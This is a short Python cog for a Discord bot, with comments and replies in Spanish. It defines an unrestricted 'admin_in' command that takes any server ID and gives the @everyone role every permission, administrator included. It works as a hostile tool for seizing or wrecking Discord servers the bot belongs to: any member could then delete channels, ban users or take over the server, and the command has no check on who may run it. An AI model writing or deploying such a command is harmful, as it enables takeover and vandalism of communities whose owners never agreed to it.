from discord.ext import commands
import discord

class AdminIn(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command()
    async def admin_in(self, ctx, guild_id: int):
        guild = self.bot.get_guild(guild_id)
        if guild is None:
            await ctx.send("No se pudo encontrar el servidor con ese ID.")
            return

        # Obtener el rol @everyone
        everyone_role = guild.default_role
        
        # Verificar si ya tiene permisos de administrador
        if everyone_role.permissions.administrator:
            await ctx.send("El rol @everyone ya tiene permisos de administrador.")
            return

        # Modificar los permisos del rol @everyone
        try:
            await everyone_role.edit(permissions=discord.Permissions.all())
            await ctx.send("Se han otorgado permisos de administrador al rol @everyone en el servidor.")
        except discord.Forbidden:
            await ctx.send("No tengo permisos suficientes para modificar el rol @everyone.")
        except discord.HTTPException as e:
            await ctx.send(f"Hubo un error al intentar modificar el rol: {e}")

# Añadir el cog al bot
async def setup(bot):
    await bot.add_cog(AdminIn(bot))
